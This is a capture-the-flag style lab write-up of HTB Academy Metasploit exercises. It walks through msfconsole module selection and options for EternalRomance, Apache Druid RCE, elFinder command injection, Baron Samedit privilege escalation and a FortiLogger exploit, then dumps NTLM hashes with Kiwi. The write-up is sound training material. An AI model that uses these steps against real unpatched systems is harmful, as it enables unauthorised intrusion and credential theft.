Using the Metasploit Framework Writeup

Category: Exploitation & Post-Exploitation Target: HTB Academy skills-assessment boxes (Windows SMB host, Apache Druid host, elFinder host, FortiLogger host)

Overview

This assessment covered the core Metasploit Framework workflow across four modules: MSF Components (Modules), Payloads, MSF Sessions and Jobs, and Meterpreter. Each task followed the same general pattern: identify a vulnerable service, find the matching module in msfconsole, configure and run the exploit, then use the resulting session to locate a flag or answer a specific question about the compromised host. The tasks progressed from a straightforward remote SMB exploit to local privilege escalation and credential extraction with Meterpreter's Kiwi extension.

Per HTB's Terms of Service, flags are not fully shown

MSF Components: Modules

**Goal: Exploit the target with EternalRomance and find the flag.txt file on the Administrator's desktop.**

Identified the underlying vulnerability while reading through the module material: <img width="723" height="63" alt="image" src="https://github.com/user-attachments/assets/5eab4c24-c8d0-419e-9fb6-f3c9cbd0ec51" />


Confirmed SMB (port 445) was open on the target:

nmap -sV -sC <ip>

<img width="255" height="56" alt="image" src="https://github.com/user-attachments/assets/e613043a-4c52-48ed-b04b-71e3ec76c2ec" />


Opened msfconsole and searched for the exact exploit:

<img width="322" height="66" alt="image" src="https://github.com/user-attachments/assets/66026ed7-0f2c-484c-8a3d-96ca6ae65fb2" />

<img width="975" height="89" alt="image" src="https://github.com/user-attachments/assets/da180f3b-d3ff-4f9d-b7a7-b7708af068df" />

Selected the module, checked show options, and set what was needed:

use exploit/windows/smb/ms17_010_psexec

<img width="975" height="139" alt="image" src="https://github.com/user-attachments/assets/290a0a44-96b0-4253-9447-e5be72b11abd" />

run

Once the Meterpreter session opened, an initial attempt to cd directly into a user's Desktop failed, since the session was running as NT AUTHORITY\SYSTEM rather than a real user profile:

<img width="975" height="325" alt="image" src="https://github.com/user-attachments/assets/50dd83fa-118b-4624-a665-61f752665e62" />


Switched to a forward-slash path and listed the Users directory to see who was available, found an Administrator account, then moved into their Desktop:

<img width="381" height="48" alt="image" src="https://github.com/user-attachments/assets/1a5f14fb-f87a-4a56-8169-743b78bf3744" />

<img width="602" height="427" alt="image" src="https://github.com/user-attachments/assets/3ad4038e-3419-4fb9-8816-6adf4ec3b47e" />


Read the flag:

<img width="624" height="53" alt="Untitled design (5)" src="https://github.com/user-attachments/assets/855568ac-aaeb-4682-b5e8-a62b89a1f61c" />


**Payloads:**

**Goal: Exploit the Apache Druid service and find the flag.txt file.**

The hint for this task was to use search, so searched msfconsole directly for the service:

<img width="494" height="84" alt="image" src="https://github.com/user-attachments/assets/38c35345-c31e-4bd5-9dd5-450f1e823e1b" />

<img width="975" height="110" alt="image" src="https://github.com/user-attachments/assets/c07cf2db-150b-4e8a-9aaf-aa8296aa4658" />


Used the first remote-execution result, set the required options, and ran it:

use exploit/linux/http/apache_druid_js_rce
set RHOST target_ip
set LHOST tun0
run

With the session open, listed the contents of /root:

<img width="975" height="503" alt="image" src="https://github.com/user-attachments/assets/556aedda-708d-4378-b870-e515e86090aa" />


Read the flag:
<img width="624" height="59" alt="Untitled design (6)" src="https://github.com/user-attachments/assets/dd30ce52-d520-4bb0-9149-c2e6a1d3aa8d" />


**MSF Sessions and Jobs**
**Q1**. The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

Loaded the target's IP in a browser and viewed the page source:

<img width="936" height="47" alt="image" src="https://github.com/user-attachments/assets/76968a0a-6dd0-442a-8efe-e305a8a72e7c" />


Answer: **finder

**Q2**. Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

Searched msfconsole for the identified application:

<img width="975" height="84" alt="image" src="https://github.com/user-attachments/assets/f4199e99-3946-44dc-a6ed-8aa81584dd9e" />

Set the required options and ran it:

use exploit/linux/http/elfinder_archive_cmd_injection
<img width="975" height="154" alt="image" src="https://github.com/user-attachments/assets/5cc8549f-8bf9-4641-8a40-9a03b6fe43a3" />

run

Dropped from Meterpreter into a full shell to check the current user:

<img width="917" height="67" alt="image" src="https://github.com/user-attachments/assets/2faeeb3c-d5cb-4f1b-8cae-a1ac05ed1034" />


<img width="130" height="59" alt="Untitled design (8)" src="https://github.com/user-attachments/assets/872d70a2-a441-4b8a-b530-4bb4c6d94738" />

Answer: www-****

**Q3**. The target system has an old version of Sudo running. Find the relevant exploit, get root access, and find the flag.txt file.

Backgrounded the current session to return to the msfconsole prompt:

<img width="780" height="88" alt="image" src="https://github.com/user-attachments/assets/1ace7033-434e-454c-a1f0-d5c32aba624f" />


An initial search sudo returned around 90 results, too many to page through usefully. Instead, went back into the existing session and checked the installed Sudo version directly:

<img width="683" height="223" alt="image" src="https://github.com/user-attachments/assets/8380cf30-aabd-4a28-9c5e-5a4986621bbb" />

<img width="975" height="99" alt="image" src="https://github.com/user-attachments/assets/0ca5a8c2-97b0-4151-89fe-2d58ac9b61ef" />

That version corresponds to CVE-2021-3156, a critical heap-based buffer overflow known as Baron Samedit.

Backgrounded the session again and searched msfconsole for the matching module:

<img width="975" height="98" alt="image" src="https://github.com/user-attachments/assets/6c385a2c-1a9c-4101-bbef-811084f433b7" />



This is a local privilege-escalation exploit, meaning it needs an existing foothold rather than a remote target, which the current session already provided. Rather than setting RHOST, the exploit was pointed at the existing session:

<img width="975" height="172" alt="image" src="https://github.com/user-attachments/assets/58998305-492e-4a39-83e9-ecf2b6a5b595" />

run

This spawned a second Meterpreter session running as root:

<img width="594" height="206" alt="image" src="https://github.com/user-attachments/assets/fd8e8dda-7fe7-4109-8dde-cf2f8a0e0275" />


Navigated to /root, listed its contents, and found the flag:

<img width="975" height="489" alt="image" src="https://github.com/user-attachments/assets/1fb0d6f4-432f-457f-848f-bc118fd1fcd4" />

cat /root/flag.txt to get the flag

Flag: HTB{***REDACTED***}


**Meterpreter**
**Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?**

Started with an Nmap scan:

<img width="525" height="50" alt="image" src="https://github.com/user-attachments/assets/7ac2e26c-ec0f-418d-8fca-ff760945a72b" />


This revealed a FortiLogger service running <img width="461" height="53" alt="image" src="https://github.com/user-attachments/assets/0ada88f5-77a1-44da-b5ef-efc601939e49" />


Searched msfconsole for it:

search fortilogger
<img width="975" height="90" alt="image" src="https://github.com/user-attachments/assets/bb339a16-2a2e-409a-9f1e-d605733d917a" />


Set the standard options and ran it. One typo along the way, set LHSOT tun0, was auto-corrected by Metasploit's own datastore validation:

<img width="975" height="162" alt="image" src="https://github.com/user-attachments/assets/bf711f35-c56e-4ed7-98e9-d61a8539f301" />


run

Once the session opened, checked the current user:


<img width="593" height="70" alt="Untitled design (10)" src="https://github.com/user-attachments/assets/108d6498-e74f-43a3-8135-f15ce1436730" />



Answer: NT AUTHORITY***

**Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.**

Attempted a SAM hash dump directly in the Meterpreter session:

<img width="975" height="77" alt="image" src="https://github.com/user-attachments/assets/d55bcef2-bf44-47ce-adf7-fa647af38fea" />


This failed, since the command requires the kiwi extension:

[-] The "lsa_dump_sam" command requires the "kiwi" extension to be loaded (run: `load kiwi`)

Loaded the extension and re-ran the dump:

<img width="277" height="73" alt="image" src="https://github.com/user-attachments/assets/34b1943e-6e26-4d9b-81bf-e1adb4219cbf" />

lsa_dump_sam

<img width="624" height="95" alt="Untitled design (9)" src="https://github.com/user-attachments/assets/2de99e99-e693-4718-9174-8e5814fe8d1e" />


Answer: cf3a5525ee9****

Reasoning / Chain Summary:
1. Identified the vulnerable service or CVE for each target (EternalRomance, Apache Druid, elFinder, an outdated Sudo, FortiLogger).
2. Used msfconsole's search to go from a CVE, product name, or nickname straight to the exact matching module path.
3. Set the standard exploit options (RHOST, LHOST) and ran each remote exploit to obtain an initial Meterpreter session.
4. Where navigation or a command failed (a cd into a SYSTEM-owned path, or lsa_dump_sam without kiwi loaded), adjusted the approach rather than assuming the exploit itself had failed.
5. For local privilege escalation (Baron Samedit), backgrounded the existing session and pointed the local exploit module at that SESSION instead of a remote host.
6. Used the resulting elevated or extended session (root access, or the kiwi extension) to retrieve the final flag, username, or hash requested by each question.

Each module reinforced the same underlying loop: identify the service, find the module, configure it, run it, then use the resulting access correctly, which sometimes meant adjusting for how the session behaved rather than just repeating the same commands from a Windows or Linux desktop environment.

Tools Used:

- msfconsole (Metasploit Framework)
- nmap
- Meterpreter
- Kiwi extension (Mimikatz integration for Meterpreter)

Lessons Learned:

- search in msfconsole is the fastest way from "I know the CVE or product" to the exact module path, whether searching by CVE number, product name, or a known nickname like Baron Samedit.
- A stalled cd in Meterpreter does not always mean the path is wrong. Running as NT AUTHORITY\**** rather than a real desktop user can break relative navigation; switching to an absolute forward-slash path and listing directories resolved it.
- Not every exploit targets RHOST. Local privilege-escalation modules like sudo_baron_samedit operate against an existing session instead, so SESSION is set rather than a remote host.
- background keeps a session alive while returning to msfconsole to search for and launch a second exploit, such as a local privesc, without losing the original foothold.
- Some post-exploitation commands require an extension to be loaded first, such as lsa_dump_sam needing load kiwi.
- A typo in set does not necessarily break the flow. Metasploit flags an unrecognized datastore option and suggests the likely intended one, such as LHSOT being corrected to LHOST.
